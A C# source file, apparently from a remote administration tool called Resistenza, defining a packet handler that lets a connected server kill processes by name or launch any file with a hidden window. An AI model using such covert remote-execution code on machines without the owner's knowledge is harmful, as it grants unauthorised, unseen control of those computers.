using Resistenza.Common.Networking;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Resistenza.Common.Packets.Task_Manager
{
    public class ActionOnProcessRequest
    {

        public string Type { get; set; }
        public string Name { get; set; }
        public PossibleActionsOnProcess Action { get; set; }

        public ActionOnProcessRequest() {

            Type = this.GetType().ToString();
        }    

        public async Task HandleAsync(SecureStream _ServerStream)
        {

            switch (Action)
            {
                case PossibleActionsOnProcess.END_PROCESS:

                    Process[] TargetProcess = Process.GetProcessesByName(Name);
                    ActionOnProcessResponse Result  = new ActionOnProcessResponse();    
                    foreach (Process process in TargetProcess)
                    {
                        try
                        {
                            process.Kill();
                            process.WaitForExit();
                            process.Dispose();
                            
                        }
                        catch(Exception e)
                        {
                            Result.Error = e.Message;
                            await _ServerStream.SendPacketAsync(Result);
                            return;
                        }                                           
                    }
                    Result.Name = Name;
                    Result.PossibleActionsOnProcess = Action;
                    await _ServerStream.SendPacketAsync(Result);
                    return;

                case PossibleActionsOnProcess.CREATE_PROCESS:

                    ActionOnProcessResponse StartResult = new ActionOnProcessResponse();
                    ProcessStartInfo processStartInfo = new ProcessStartInfo();
                    processStartInfo.FileName = Name;
                    processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    processStartInfo.UseShellExecute = false;

                    try
                    {
                        Process.Start(processStartInfo);
                    }
                    catch(Exception e) { 

                        StartResult.Error = e.Message;
                        await _ServerStream.SendPacketAsync(StartResult);
                        return;
                    }

                    StartResult.Name = Name;
                    StartResult.PossibleActionsOnProcess = Action;
                    await _ServerStream.SendPacketAsync(StartResult);
                    return;
            }


        }
    }

   

    public enum PossibleActionsOnProcess
    {
        CREATE_PROCESS,
        END_PROCESS,
    }
}
